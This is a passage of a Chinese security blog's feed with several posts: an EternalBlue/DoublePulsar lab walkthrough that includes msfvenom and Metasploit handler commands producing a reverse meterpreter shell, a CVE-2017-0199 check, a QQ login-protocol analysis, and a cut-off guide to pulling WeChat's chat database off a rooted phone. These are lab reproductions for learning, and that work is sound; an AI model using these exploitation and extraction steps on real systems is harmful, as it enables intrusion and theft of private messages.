id="Kali下结果"><a href="#Kali下结果" class="headerlink" title="Kali下结果"></a>Kali下结果</h5><p><img src="Kali%E4%B8%8A%E7%BB%93%E6%9E%9C.png" alt="Kali上结果"></p><h4 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h4><h5 id="如何判断是否受到影响（2017-04-19）"><a href="#如何判断是否受到影响（2017-04-19）" class="headerlink" title="如何判断是否受到影响（2017.04.19）"></a>如何判断是否受到影响（2017.04.19）</h5><p>新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建<br>在文件名中输入获取的hta链接，并选中链接到文件<br>如果出现如下结果，则说明受到影响</p><p><img src="%E6%A3%80%E6%B5%8B.gif" alt="检测是否受到影响"></p><p>如果仅仅出现下面的弹窗，则说明不受影响，就不需要接下来的测试了。。<br><img src="%E5%87%BA%E9%94%99%E5%BC%B9%E7%AA%97.png" alt="出错弹窗"></p><blockquote><p>主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥····</p></blockquote><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1" target="_blank" rel="noopener">http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1</a><br><a href="https://github.com/rapid7/metasploit-framework/pull/8254" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/8254</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2017-0199 </tag>
            
            <tag> office漏洞 </tag>
            
            <tag> Msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>方程式漏洞利用之SMB</title>
      <link href="/2017/04/15/%E6%96%B9%E7%A8%8B%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BSMB/"/>
      <url>/2017/04/15/%E6%96%B9%E7%A8%8B%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BSMB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>| 主机 | IP |备注|<br>|——–|——–|<br>|  Win7 64位      |    192.168.232.133    |靶机（开启smb）|<br>|XP|192.168.232.128|攻击机1|<br>|Kali|192.168.232.134|攻击机2|</p><a id="more"></a><h5 id="攻击机软件安装"><a href="#攻击机软件安装" class="headerlink" title="攻击机软件安装"></a>攻击机软件安装</h5><p>1.下载<a href="https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows" target="_blank" rel="noopener">https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows</a><br>2.<strong>安装Python2.6 32位</strong><br><img src="python%E7%89%88%E6%9C%AC.png" alt="python版本"></p><p>安装后，运行fb.py，发现错误<code>ImportError: No module named win32pipe</code></p><p><img src="win32pipe%E9%94%99%E8%AF%AF.png" alt="win32pipe错误"></p><p>搜索后提示需要安装<code>pywin32-216.win32-py2.6.exe</code>，下载地址<a href="https://sourceforge.net/projects/pywin32/files%2Fpywin32/" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files%2Fpywin32/</a><br>选择对应的版本。<br>结果又发现错误</p><p><img src="%E6%89%BE%E4%B8%8D%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E6%A8%A1%E5%9D%97.png" alt="找不到指定的模块"></p><p>切换到Python的安装目录的Scripts下，执行命令<code>pywin32_postinstall.py -install</code><br><img src="%E8%A7%A3%E5%86%B3%E6%89%BE%E4%B8%8D%E5%88%B0%E6%A8%A1%E5%9D%97.png" alt="解决找不到模块"></p><p>运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可<br><img src="%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95.png" alt="创建目录"></p><h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目<br><img src="%E6%93%8D%E4%BD%9C1.png" alt="操作1"><br>之后一路回车，需要操作的地方已经标记<br>选择SMB工具模块，使用命令<code>use Eternalblue</code><br><img src="%E6%93%8D%E4%BD%9C2.png" alt="操作2"><br>选择目标系统<br><img src="%E6%93%8D%E4%BD%9C3.png" alt="操作3"><br>输入命令<code>use Doublepulsar</code><br><img src="%E6%93%8D%E4%BD%9C4.png" alt="操作4"><br><img src="%E6%93%8D%E4%BD%9C5.png" alt="操作5"></p><p>在Kali上生成dll文件，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134  LPORT=5555 -f dll &gt; s.dll</span><br></pre></td></tr></table></figure><p>然后copy到XP系统中，记下位置，如C:\s.dll<br>kali上运行msf，具体命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.232.134</span><br><span class="line">LHOST =&gt; 192.168.232.134</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 5555</span><br><span class="line">LPORT =&gt; 5555</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="%E6%93%8D%E4%BD%9C6.png" alt="操作6"></p><p>在XP上输入dll文件的位置，一路回车<br><img src="%E6%93%8D%E4%BD%9C7.png" alt="操作7"><br>显示Doublepulsar Succeeded<br><img src="%E6%93%8D%E4%BD%9C8.png" alt="操作8"></p><p>查看kali上发现已经反弹shell 了<br><img src="%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9.png" alt="成功反弹"></p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。<br>这里有视频可以看一下<a href="https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0" target="_blank" rel="noopener">https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0</a></p>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方程式 </tag>
            
            <tag> SMB漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ登录简单分析，附易语言登录代码</title>
      <link href="/2017/04/10/QQ%E7%99%BB%E5%BD%95%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%8C%E9%99%84%E6%98%93%E8%AF%AD%E8%A8%80%E7%99%BB%E5%BD%95%E4%BB%A3%E7%A0%81/"/>
      <url>/2017/04/10/QQ%E7%99%BB%E5%BD%95%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%8C%E9%99%84%E6%98%93%E8%AF%AD%E8%A8%80%E7%99%BB%E5%BD%95%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>这里参考了QQ登录的组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="%E7%99%BB%E5%BD%95%E7%BB%84%E4%BB%B6.png" alt="登录组件"></p><p>QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。</p><h3 id="一、无需验证码"><a href="#一、无需验证码" class="headerlink" title="一、无需验证码"></a>一、无需验证码</h3><h4 id="第一步：获取-login-sig"><a href="#第一步：获取-login-sig" class="headerlink" title="第一步：获取 login_sig"></a>第一步：获取 login_sig</h4><p>这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。<br>访问如下地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm</span><br></pre></td></tr></table></figure><p>从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig</p><p><img src="%E8%8E%B7%E5%8F%96login_sig%E7%9A%84%E5%80%BC.png" alt="获取login_sig的值"></p><h4 id="第二步：获取-checkVC"><a href="#第二步：获取-checkVC" class="headerlink" title="第二步：获取 checkVC"></a>第二步：获取 checkVC</h4><p>这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（<strong>不需要输入验证码的情况下</strong>）。<br>请求地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40</span><br></pre></td></tr></table></figure><p>其中参数uin是登录的qq号码，login_sig是从第一步获取的值。<br><img src="%E8%8E%B7%E5%8F%96check_vc.png" alt="获取check_vc"><br>当然这种情况是在QQ号输入正确，并且不需要输入验证码时。<br>返回的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptui_checkVC(&#39;0&#39;,&#39;!BAF&#39;,&#39;\x00******\x64\x21\x97\x92&#39;,&#39;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&#39;,&#39;2&#39;);</span><br></pre></td></tr></table></figure><blockquote><p>第一个值表示是否需要图片验证码，0表示不需要<br>    第二值是verifycode，登录时需要<br>    第三个值是salt，QQ转换而来<br>    第四个值是pt_verifysession_v1</p></blockquote><h4 id="第三步：登录"><a href="#第三步：登录" class="headerlink" title="第三步：登录"></a>第三步：登录</h4><p>输入密码后点登录，请求包为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数名称</th><th>说明</th></tr></thead><tbody><tr><td>u</td><td>用户输入。第二步骤中  uin的值</td></tr><tr><td>verifycode</td><td>第二步中ptui_checkVC第二个值。(这里的是!BAF)</td></tr><tr><td>pt_verifysession_v1</td><td>第二步中ptui_checkVC第四个值。即e9825f1….</td></tr><tr><td>p</td><td>加密后的密码</td></tr><tr><td>login_sig</td><td>第一步中返回Cookie中的 pt_login_sig值</td></tr><tr><td>pt_randsalt</td><td>pt_randsalt=0  旧版加密 ；pt_randsalt=2 新版RSA加密</td></tr></tbody></table><p>密码加密的js代码地址<code>http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js</code>，注意看js版本，这里是js_ver为10197</p><blockquote><p>密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ）</p></blockquote><p>用户名密码正确返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptuiCB(&#39;0&#39;,&#39;0&#39;,&#39;http:&#x2F;&#x2F;www.qq.com&#x2F;qq2012&#x2F;loginSuccess.htm&#39;,&#39;0&#39;,&#39;登录成功！&#39;, &#39;QQ昵称&#39;);</span><br></pre></td></tr></table></figure><p>用户名密码错误返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptuiCB(&#39;3&#39;,&#39;0&#39;,&#39;&#39;,&#39;0&#39;,&#39;您输入的帐号或密码不正确，请重新输入。&#39;, &#39;&#39;);</span><br></pre></td></tr></table></figure><p>附上一张登录成功的截图<br><img src="%E6%97%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png" alt="无验证码登录成功"></p><h3 id="二、需要输入验证码"><a href="#二、需要输入验证码" class="headerlink" title="二、需要输入验证码"></a>二、需要输入验证码</h3><h4 id="第一步：获取login-sig"><a href="#第一步：获取login-sig" class="headerlink" title="第一步：获取login_sig"></a>第一步：获取login_sig</h4><p>与上面无需验证码一样，就省略了。</p><h4 id="第二步：获取cap-cd"><a href="#第二步：获取cap-cd" class="headerlink" title="第二步：获取cap_cd"></a>第二步：获取cap_cd</h4><p>请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptui_checkVC(&#39;1&#39;,&#39;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&#39;,&#39;\x00\x00\x00\x00\x3a\xde\x68\xb1&#39;,&#39;&#39;,&#39;2&#39;);</span><br></pre></td></tr></table></figure><p>cap_cd的值为<code>yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**</code></p><h4 id="第三步：获取sess"><a href="#第三步：获取sess" class="headerlink" title="第三步：获取sess"></a>第三步：获取sess</h4><p>请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849</span><br></pre></td></tr></table></figure><blockquote><p>uid是qq号，cap_cd由第二步获取</p></blockquote><p>返回：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;)</span><br></pre></td></tr></table></figure><h4 id="第四步：获取visg"><a href="#第四步：获取visg" class="headerlink" title="第四步：获取visg"></a>第四步：获取visg</h4><p>请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999</span><br></pre></td></tr></table></figure><p><img src="%E8%8E%B7%E5%8F%96visg.png" alt="获取visg"></p><h4 id="第五步：获取图片验证码"><a href="#第五步：获取图片验证码" class="headerlink" title="第五步：获取图片验证码"></a>第五步：获取图片验证码</h4><p>访问地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1</span><br></pre></td></tr></table></figure><h4 id="第六步：验证验证码，获取verifycode和pt-verifysession-v1"><a href="#第六步：验证验证码，获取verifycode和pt-verifysession-v1" class="headerlink" title="第六步：验证验证码，获取verifycode和pt_verifysession_v1"></a>第六步：验证验证码，获取verifycode和pt_verifysession_v1</h4><p>post请求：<br><code>http://captcha.qq.com/cap_union_new_verify?random=1488013134675</code></p><p>提交内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2Uif9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm</span><br></pre></td></tr></table></figure><p>验证码输入正确返回：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"errorCode"</span>:<span class="string">"0"</span> , <span class="string">"randstr"</span> : <span class="string">"@mDo"</span> , <span class="string">"ticket"</span> : <span class="string">"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*"</span> , <span class="string">"errMessage"</span>:<span class="string">"OK"</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>verifycode为randstr，pt_verifysession_v1为ticket</p></blockquote><h4 id="第七步：-验证用户名密码是否正确"><a href="#第七步：-验证用户名密码是否正确" class="headerlink" title="第七步： 验证用户名密码是否正确"></a>第七步： 验证用户名密码是否正确</h4><p>请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1in-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp;</span><br></pre></td></tr></table></figure><blockquote><p>带验证码登录可能存在问题，待修改</p></blockquote><p><a href="http://fuping.site/2017/04/10/QQ登录简单分析，附易语言登录代码/QQLogin.e">易语言实现代码</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ登录 </tag>
            
            <tag> 易语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信聊天记录读取</title>
      <link href="/2017/04/09/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E8%AF%BB%E5%8F%96/"/>
      <url>/2017/04/09/%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>根据<a href="http://blog.csdn.net/jiangwei0910410003/article/details/52238891" target="_blank" rel="noopener">四哥</a>教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。</p><a id="more"></a><h3 id="微信聊天记录保存位置"><a href="#微信聊天记录保存位置" class="headerlink" title="微信聊天记录保存位置"></a>微信聊天记录保存位置</h3><p>微信聊天记录的数据库文件保存在<code>/data/data/com.tencent.mm/MicroMsg/32位字符串/</code>中，名字为<code>EnMicroMsg.db</code>。</p><p><img src="%E5%BE%AE%E4%BF%A1%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE.png" alt="微信数据库文件位置"></p><h3 id="将聊天记录数据库文件导出"><a href="#将聊天记录数据库文件导出" class="headerlink" title="将聊天记录数据库文件导出"></a>将聊天记录数据库文件导出</h3><p>使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db</span><br></pre></td></tr></table></figure><p><img src="%E5%AF%BC%E5%87%BA1.png" alt="导出1"><br>直接导出提示不存在，因为是权限的问题。<br>使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了<code>/data/local/tmp</code>文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp EnMicroMsg.db /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>然后导出，执行命令<code>adb pull /data/local/tmp/EnMicroMsg.db</code></p><p><img src="%E6%9D%83%E9%99%90%E4%B8%8D%E8%B6%B3.png" alt="权限不足"></p><p>提示权限不足，修改权限后导出。</p><p><img src="%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90%E5%AF%BC%E5%87%BA.png" alt="修改权限导出"></p><h3 id="查看SharedPreferences中保存的UIN的值"><a href="#查看SharedPreferences中保存的UIN的值" class="headerlink" title="查看SharedPreferences中保存的UIN的值"></a>查看SharedPreferences中保存的UIN的值</h3><p>切换到<code>/data/data/com.tencent.mm/shared_prefs</code>目录，然后执行<code>grep -rn &quot;uin&quot; *</code>来查看保存的UIN的值</p><p><img src="Shared_Pre%E6%96%87%E4%BB%B6.png" alt="Shared_Pre文件"><br><img src="%E6%9F%A5%E7%9C%8BUIN%E7%9A%84%E5%80%BC.png" alt="查看UIN的值"></p><h3 id="读取微信数据库文件内容"><a href="#读取微信数据库文件内容" class="headerlink" 